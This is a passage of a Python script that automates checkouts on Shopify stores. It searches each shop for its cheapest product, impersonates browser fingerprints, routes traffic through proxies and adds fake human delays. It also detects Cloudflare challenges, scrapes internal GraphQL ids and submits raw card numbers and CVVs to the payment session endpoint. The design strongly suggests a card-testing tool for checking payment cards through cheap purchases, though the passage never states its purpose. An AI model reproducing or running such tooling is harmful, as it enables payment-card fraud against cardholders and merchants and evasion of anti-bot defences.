        r'"deliveryHandle"\s*:\s*"([^"]+)"',
    ]
    for p in patterns:
        m = re.search(p, proposal_body)
        if m and m.group(1) and len(m.group(1)) >= 15:
            return m.group(1)
    try:
        data = json.loads(proposal_body)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal", {}))
        for line in seller.get("delivery", {}).get("deliveryLines", []) or []:
            sds = line.get("selectedDeliveryStrategy") or {}
            for key in ("handle", "signedHandle"):
                v = sds.get(key)
                if isinstance(v, str) and len(v) >= 15:
                    return v
            dsbh = sds.get("deliveryStrategyByHandle") or {}
            v = dsbh.get("handle")
            if isinstance(v, str) and len(v) >= 15:
                return v
            v = line.get("deliveryHandle")
            if isinstance(v, str) and len(v) >= 15:
                return v
        de = seller.get("deliveryExpectations") or {}
        for exp in de.get("deliveryExpectations", []) or []:
            if isinstance(exp, dict):
                v = exp.get("signedHandle") or exp.get("handle")
                if isinstance(v, str) and len(v) >= 15:
                    return v
    except Exception:
        pass
    return ""


def extract_signed_handles(proposal_json: str) -> List[str]:
    try:
        data = json.loads(proposal_json)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal", {}))
        de = seller.get("deliveryExpectations") or {}
        typename = de.get("__typename", "")
        if typename in ("UnfilledDeliveryExpectationTerms", "UnavailableTerms", "PendingTerms"):
            return []
        exps = de.get("deliveryExpectations")
        if isinstance(exps, list):
            handles = [x.get("signedHandle") for x in exps if isinstance(x, dict) and x.get("signedHandle")]
            if handles:
                return handles
    except Exception:
        pass
    return []


def extract_shipping_amount(proposal_body: str) -> str:
    m = re.search(r'"deliveryStrategyBreakdown"\s*:\s*\[\s*\{\s*"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return m.group(1) if m else ""


def extract_checkout_total(proposal_body: str) -> str:
    m = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return m.group(1) if m else ""


def extract_seller_total(proposal_body: str) -> str:
    m = re.search(r'"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return m.group(1) if m else ""


def extract_running_total(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        val = (data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal", {}).get("runningTotal", {}).get("value", {}))
        return val.get("amount", "")
    except Exception:
        return ""


def extract_seller_merchandise_price(proposal_body: str) -> str:
    m = re.search(r'"ContextualizedProductVariantMerchandise".*?"totalAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body, re.DOTALL)
    return m.group(1) if m else ""


def extract_seller_currency(proposal_body: str) -> str:
    m = re.search(r'"supportedCurrencies"\s*:\s*\["([^"]+)"', proposal_body)
    return m.group(1) if m else ""


def extract_seller_country(proposal_body: str) -> str:
    m = re.search(r'"supportedCountries"\s*:\s*\["([^"]+)"', proposal_body)
    return m.group(1) if m else ""


def extract_tax_amount(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        val = (data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal", {}).get("tax", {}).get("totalTaxAmount", {}).get("value", {}))
        return val.get("amount", "0.0")
    except Exception:
        return "0.0"


def extract_tax_from_rejected(submit_json: str) -> str:
    try:
        data = json.loads(submit_json)
        seller = (data.get("data", {}).get("submitForCompletion", {}).get("sellerProposal", {}))
        return seller.get("tax", {}).get("totalTaxAmount", {}).get("value", {}).get("amount", "0.0")
    except Exception:
        return "0.0"


def extract_total_from_rejected(submit_json: str) -> str:
    try:
        data = json.loads(submit_json)
        seller = (data.get("data", {}).get("submitForCompletion", {}).get("sellerProposal", {}))
        for key in ("checkoutTotal", "total", "runningTotal"):
            val = seller.get(key, {}).get("value", {}).get("amount")
            if val:
                return val
        return ""
    except Exception:
        return ""


def extract_receipt_id(submit_body: str) -> str:
    m = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', submit_body)
    return m.group(1) if m else ""


def extract_receipt_session_token(submit_body: str) -> str:
    m = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', submit_body)
    return m.group(1) if m else ""


def extract_payment_gateways(proposal_body: str) -> List[dict]:
    try:
        seller = (json.loads(proposal_body).get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal", {}))
    except Exception:
        return []
    lines = (seller.get("payment") or {}).get("availablePaymentLines") or []
    out, seen = [], set()
    for line in lines:
        pm = line.get("paymentMethod") or {}
        if not pm:
            continue
        entry = {
            "typename": pm.get("__typename", ""),
            "name": pm.get("name", ""),
            "display": pm.get("extensibilityDisplayName") or pm.get("displayName") or pm.get("name", ""),
            "id": pm.get("paymentMethodIdentifier", ""),
        }
        k = (entry["typename"], entry["name"], entry["id"])
        if k in seen:
            continue
        seen.add(k)
        out.append(entry)
    return out


def extract_receipt_url(poll_body: str, shop_url: str = "") -> str:
    try:
        poll_json = json.loads(poll_body)
        receipt = poll_json.get("data", {}).get("receipt", {})
        for key in ("confirmationPage",):
            v = receipt.get(key) or {}
            u = v.get("url", "") if isinstance(v, dict) else ""
            if u.startswith("http"):
                return u
        for key in ("confirmationPageUrl",):
            u = receipt.get(key, "")
            if u and u.startswith("http"):
                return u
        order = receipt.get("order") or {}
        for key in ("confirmationPageUrl", "orderStatusPageUrl", "orderStatusUrl"):
            u = order.get(key, "")
            if u and u.startswith("http"):
                return u
        rid = receipt.get("id", "")
        if rid and "gid://shopify/" in rid:
            num = rid.rstrip("/").split("/")[-1]
            if num.isdigit() and shop_url:
                return f"{shop_url.rstrip('/')}/orders/{num}"
        for pat in [
            r'"confirmationPage"\s*:\s*\{[^}]*"url"\s*:\s*"(https?://[^"]+)"',
            r'"confirmationPageUrl"\s*:\s*"(https?://[^"]+)"',
            r'"orderStatusPageUrl"\s*:\s*"(https?://[^"]+)"',
            r'"orderStatusUrl"\s*:\s*"(https?://[^"]+)"',
            r'"thankYouUrl"\s*:\s*"(https?://[^"]+)"',
            r'"receiptUrl"\s*:\s*"(https?://[^"]+)"',
        ]:
            m = re.search(pat, poll_body)
            if m:
                return m.group(1)
    except Exception:
        pass
    return ""


def patch_payload(payload: str, currency: str, country: str) -> str:
    if not currency:
        currency = "USD"
    if not country:
        country = "US"
    currency = currency.upper().strip()
    country = country.upper().strip()
    if currency != "USD":
        payload = payload.replace('"currencyCode": "USD"', f'"currencyCode": "{currency}"')
        payload = payload.replace('"presentmentCurrency": "USD"', f'"presentmentCurrency": "{currency}"')
        payload = payload.replace('"currencyCode":"USD"', f'"currencyCode":"{currency}"')
    if country != "US":
        payload = payload.replace('"countryCode": "US"', f'"countryCode": "{country}"')
        payload = payload.replace('"countryCode":"US"', f'"countryCode":"{country}"')
    return payload


def generate_attempt_token(checkout_token: str) -> str:
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    return f"{checkout_token}-{''.join(random.choice(chars) for _ in range(10))}"


def generate_page_id() -> str:
    return f"{random.getrandbits(64):016x}"


def extract_all_checkout_js_urls(checkout_html: str, shop_url: str) -> List[str]:
    if not checkout_html:
        return []
    matches = re.findall(
        r'(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_\-/]+\.[A-Za-z0-9_\-]+\.js)',
        checkout_html
    )
    seen, urls = set(), []
    for m in matches:
        if m not in seen:
            seen.add(m)
            urls.append(shop_url + m)
    return urls


def extract_ids_from_js(js_body: str) -> Tuple[str, str, str]:
    if not js_body:
        return "", "", ""
    pid = sid = poll = ""
    m = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js_body)
    if m:
        pid = m.group(1)
    m = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js_body)
    if m:
        sid = m.group(1)
    for pat in [
        r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"',
        r'name:\s*"PollForReceipt"[^}]{0,300}?id:\s*"([a-f0-9]{64})"',
        r'PollForReceipt.{0,300}?([a-f0-9]{64})',
    ]:
        m = re.search(pat, js_body)
        if m:
            poll = m.group(1)
            break
    if not pid or not sid:
        for pat in (
            r'"Proposal"\s*:\s*"([a-f0-9]{64})"',
            r'"SubmitForCompletion"\s*:\s*"([a-f0-9]{64})"',
        ):
            m = re.search(pat, js_body)
            if m and not pid:
                pid = m.group(1)
            elif m and not sid:
                sid = m.group(1)
    return pid, sid, poll


async def _fetch_products_page(client: AsyncTLSClient, shop_url: str, page: int = 1) -> list:
    resp = await client.get(
        f"{shop_url}/products.json?sort_by=price-ascending&limit=250&page={page}"
    )
    if resp.status_code == 429:
        raise Exception("products.json 429 rate limit")
    if resp.status_code == 503:
        raise Exception("products.json 503")
    if resp.status_code != 200:
        body = resp.text[:200].lower()
        if "cloudflare" in body or "1003" in body:
            raise Exception("cloudflare block")
        raise Exception(f"products.json returned {resp.status_code}")
    try:
        return resp.json().get("products", [])
    except Exception:
        raise Exception("products.json invalid JSON")


def _best_entry(products: list, min_price: float, max_price: float):
    best = None
    best_price = float("inf")
    for p in products:
        variants = p.get("variants", [])
        # sort variants by price ascending to get cheapest first
        try:
            variants = sorted(variants, key=lambda v: _to_float(v.get("price")) or float("inf"))
        except Exception:
            pass
        for v in variants:
            avail = v.get("available")
            # treat None as available (some shops omit this field)
            if avail is False:
                continue
            price = _to_float(v.get("price"))
            if price is None:
                continue
            if price < min_price or price > max_price:
                continue
            if price < best_price:
                best_price = price
                best = (
                    p.get("title", ""),
                    str(p.get("id", "")),
                    p.get("handle", ""),
                    str(v.get("id", "")),
                    str(v.get("price", "")),
                )
    return best


async def find_cheapest_product(client: AsyncTLSClient, shop_url: str,
                                min_price: float = MIN_PRODUCT_PRICE,
                                max_price: float = MAX_PRODUCT_PRICE):
    cached = PRODUCT_CACHE.get(shop_url)
    if cached and (time.time() - cached[5]) < PRODUCT_CACHE_TTL:
        return cached[0], cached[1], cached[2], cached[3], cached[4]
    all_products = []
    for page in range(1, 11):
        try:
            products = await _fetch_products_page(client, shop_url, page)
        except Exception:
            if all_products:
                break
            raise
        if not products:
            break
        all_products.extend(products)
        if len(products) < 250:
            break
    if not all_products:
        raise Exception(f"products.json empty at {shop_url}")
    # try target range first, then any available product as fallback
    best = _best_entry(all_products, min_price, max_price)
    if not best:
        best = _best_entry(all_products, MIN_PRODUCT_PRICE, float("inf"))
    if best:
        PRODUCT_CACHE[shop_url] = (best[0], best[1], best[2], best[3], best[4], time.time())
        return best
    raise Exception(f"no available products at {shop_url}")


async def add_to_cart_and_checkout(client: AsyncTLSClient, shop_url: str, variant_id: str):
    try:
        await client.get(shop_url, allow_redirects=True, timeout=10)
        await _human_delay(120, 350)
    except Exception:
        pass
    cart_permalink = f"{shop_url}/cart/{variant_id}:1"
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "referer": shop_url + "/",
        "sec-ch-ua": client.sec_ch_ua,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-ch-ua-full-version-list": client.sec_ch_ua_full,
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
    }
    checkout_resp = await client.get(cart_permalink, allow_redirects=True, headers=headers)
    checkout_url = checkout_resp.url
    checkout_html = checkout_resp.text
    if checkout_resp.status_code not in (200, 302):
        raise Exception(f"cart permalink returned {checkout_resp.status_code}")
    if "cf-chl" in checkout_html[:5000] or "Just a moment" in checkout_html[:2000]:
        raise Exception("CF_MANAGED_CHALLENGE")
    tm = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
    checkout_token = tm.group(1) if tm else ""
    if not checkout_token:
        tm = re.search(r'/checkouts/([a-f0-9]{32})', checkout_url)
        if tm:
            checkout_token = tm.group(1)
    sm = re.search(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"', checkout_html)
    session_token = html.unescape(sm.group(1)).strip('"') if sm else ""
    if not session_token:
        sm = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', html.unescape(checkout_html))
        if sm:
            session_token = sm.group(1)
    return checkout_url, checkout_token, session_token, checkout_html


async def fetch_private_access_token(client: AsyncTLSClient, shop_url: str, checkout_url: str, pat_id: str) -> str:
    req_url = f"{shop_url}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "referer": checkout_url,
        "sec-ch-ua": client.sec_ch_ua,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-ch-ua-full-version-list": client.sec_ch_ua_full,
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
    }
    resp = await client.get(req_url, headers=headers)
    return f"[{resp.status_code}] {resp.text}"


async def fetch_actions_js(client: AsyncTLSClient, js_url: str, shop_url: str) -> str:
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "origin": shop_url,
        "priority": "u=1",
        "referer": shop_url + "/",
        "sec-ch-ua": client.sec_ch_ua,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-ch-ua-full-version-list": client.sec_ch_ua_full,
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
    }
    resp = await client.get(js_url, headers=headers)
    if resp.status_code != 200:
        raise Exception(f"GET js returned {resp.status_code}")
    return resp.text


def _proposal_headers(client: AsyncTLSClient, shop_url: str, checkout_url: str,
                      checkout_token: str, session_token: str, build_id: str,
                      source_token: str) -> Dict:
    return {
        "accept": "application/json",
        "accept-language": "en-US",
        "content-type": "application/json",
        "origin": shop_url,
        "priority": "u=1, i",
        "referer": checkout_url,
        "sec-ch-ua": client.sec_ch_ua,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-ch-ua-full-version-list": client.sec_ch_ua_full,
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "shopify-checkout-client": "checkout-web/1.0",
        "shopify-checkout-source": f'id="{checkout_token}", type="cn"',
        "x-checkout-one-session-token": session_token,
        "x-checkout-web-build-id": build_id,
        "x-checkout-web-deploy-stage": "production",
        "x-checkout-web-server-handling": "fast",
        "x-checkout-web-server-rendering": "yes",
        "x-checkout-web-source-id": source_token,
    }


async def send_pci_session(client: AsyncTLSClient, ident_sig: str, card_number: str,
                           card_name: str, card_month: int, card_year: int, cvv: str,
                           shop_domain: str, proxy_url: str = ""):
    payload = json.dumps({
        "credit_card": {
            "number": card_number,
            "month": card_month,
            "year": card_year,
            "verification_value": cvv,
            "start_month": None,
            "start_year": None,
            "issue_number": "",
            "name": card_name,
        },
        "payment_session_scope": shop_domain,
    })
    headers = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://checkout.pci.shopifyinc.com",
        "priority": "u=1, i",
        "referer": "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
        "sec-ch-ua": client.sec_ch_ua,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-ch-ua-full-version-list": client.sec_ch_ua_full,
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "sec-fetch-storage-access": "active",
        "shopify-identification-signature": ident_sig,
    }
    async with AsyncSession(impersonate=client.impersonate, timeout=15) as s:
        s.headers.update({
            "User-Agent": client.user_agent,
            "Accept-Language": "en-US,en;q=0.9",
            "sec-ch-ua": client.sec_ch_ua,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-ch-ua-full-version-list": client.sec_ch_ua_full,
            "DNT": "1",
            "Sec-GPC": "1",
        })
        if proxy_url:
            s.proxies = {"http": proxy_url, "https": proxy_url}
        resp = await s.post("https://checkout.pci.shopifyinc.com/sessions",
                            data=payload, headers=headers, timeout=15)
    return resp.status_code, resp.text


async def send_proposal(client, shop_url, checkout_url, checkout_token, session_token,
                        stable_id, variant_id, price, proposal_id, build_id,
                        source_token, currency, country):
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": null,
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{"partialStreetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": "", "oneTimeUse": false}}}},
        "selectedDeliveryStrategy": {{"deliveryStrategyMatchingConditions": {{"estimatedTimeInTransit": {{"any": true}}, "shipments": {{"any": true}}}}, "options": {{}}}},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{"streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}}}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{"proposedAllocations": null, "proposedTotalAmount": {{"any": true}}, "proposedTotalIncludedAmount": null, "proposedMixedStateTotalAmount": null, "proposedExemptions": []}},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{"signature": null, "signatureUuid": null, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []}},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = await client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(client, shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text


async def send_proposal2(client, shop_url, checkout_url, checkout_token, session_token,
                         stable_id, variant_id, price, proposal_id, build_id,
                         source_token, queue_token, email, currency, country):
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{"partialStreetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": "", "oneTimeUse": false}}}},
        "selectedDeliveryStrategy": {{"deliveryStrategyMatchingConditions": {{"estimatedTimeInTransit": {{"any": true}}, "shipments": {{"any": true}}}}, "options": {{}}}},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{"streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}}}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": true,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{"proposedAllocations": null, "proposedTotalAmount": {{"any": true}}, "proposedTotalIncludedAmount": null, "proposedMixedStateTotalAmount": null, "proposedExemptions": []}},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{"signature": null, "signatureUuid": null, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []}},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = await client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(client, shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text


async def send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                         stable_id, variant_id, price, proposal_id, build_id,
                         source_token, queue_token, email, addr, currency, country):
    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}",
            "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{"deliveryStrategyMatchingConditions": {{"estimatedTimeInTransit": {{"any": true}}, "shipments": {{"any": true}}}}, "options": {{}}}},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{
          "address1": "{addr.address1}",
          "address2": "{addr.address2}",
          "city": "{addr.city}",
          "countryCode": "{addr.country_code}",
          "postalCode": "{addr.postal_code}",
          "firstName": "{addr.first_name}",
          "lastName": "{addr.last_name}",
          "zoneCode": "{addr.zone_code}",
          "phone": "{addr.phone}"
        }}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": false,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{"proposedAllocations": null, "proposedTotalAmount": {{"any": true}}, "proposedTotalIncludedAmount": null, "proposedMixedStateTotalAmount": null, "proposedExemptions": []}},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{"signature": null, "signatureUuid": null, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []}},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''
    gql_payload = patch_payload(gql_payload, currency, country)
    resp = await client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(client, shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text


async def send_poll_for_receipt(client, shop_url, checkout_url, checkout_token, session_token,
                                build_id, source_token, poll_id, receipt_id, receipt_session_token):
    params = {
        "operationName": "PollForReceipt",
        "variables": json.dumps({"receiptId": receipt_id, "sessionToken": receipt_session_token}),
        "id": poll_id,
    }
    full_url = f"{shop_url}/checkouts/internal/graphql/persisted?{urllib.parse.urlencode(params)}"
    headers = _proposal_headers(client, shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    headers["x-checkout-web-source-id"] = checkout_token
    resp = await client.get(full_url, headers=headers)
    return resp.status_code, resp.text


async def send_submit_for_completion(client, shop_url, checkout_url, checkout_token, session_token,
                                     stable_id, variant_id, price, submit_id, build_id,
                                     source_token, queue_token, email, addr, delivery_handle,
                                     shipping_amount, total_amount, pci_session_id, attempt_token,
                                     currency, country, signed_handles, is_digital=False, tax_amount=None):
    handle_lines = [json.dumps({"signedHandle": h}) for h in (signed_handles or [])]
    signed_handles_json = "[" + ",".join(handle_lines) + "]"
    page_id = generate_page_id()

    if is_digital:
        total_amount_block = '"totalAmount": {"any": true}'
    else:
        total_amount_block = f'"totalAmount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}'

    if is_digital:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "selectedDeliveryStrategy": {{"deliveryStrategyMatchingConditions": {{"estimatedTimeInTransit": {{"any": true}}, "shipments": {{"any": true}}}}, "options": {{}}}},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["NONE"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": true
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": []}}'''
    else:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "destination": {{
            "streetAddress": {{
              "address1": "{addr.address1}",
              "address2": "{addr.address2}",
              "city": "{addr.city}",
              "countryCode": "{addr.country_code}",
              "postalCode": "{addr.postal_code}",
              "firstName": "{addr.first_name}",
              "lastName": "{addr.last_name}",
              "zoneCode": "{addr.zone_code}",
              "phone": "{addr.phone}",
              "oneTimeUse": false
            }}
          }},
          "selectedDeliveryStrategy": {{"deliveryStrategyByHandle": {{"handle": "{delivery_handle}", "customDeliveryRate": false}}, "options": {{}}}},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": false
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": {signed_handles_json}}}'''

    tax_val = tax_amount or "0.0"
    tax_block = f'"proposedTotalAmount": {{"value": {{"amount": "{tax_val}", "currencyCode": "USD"}}}}'

    gql_payload = f'''{{
  "variables": {{
    "input": {{
      "sessionInput": {{"sessionToken": "{session_token}"}},
      "queueToken": "{queue_token}",
      "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
      {delivery_block},
      "merchandise": {{
        "merchandiseLines": [{{
          "stableId": "{stable_id}",
          "merchandise": {{
            "productVariantReference": {{
              "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
              "variantId": "gid://shopify/ProductVariant/{variant_id}",
              "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
            }}
          }},
          "quantity": {{"items": {{"value": 1}}}},
          "expectedTotalPrice": {{"any": true}},
          "lineComponentsSource": null, "lineComponents": []
        }}]
      }},
      "memberships": {{"memberships": []}},
      "payment": {{
        {total_amount_block},
        "paymentLines": [{{
          "paymentMethod": {{
            "directPaymentMethod": {{
              "sessionId": "{pci_session_id}",
              "billingAddress": {{
                "streetAddress": {{
                  "address1": "{addr.address1}",
                  "address2": "{addr.address2}",
                  "city": "{addr.city}",
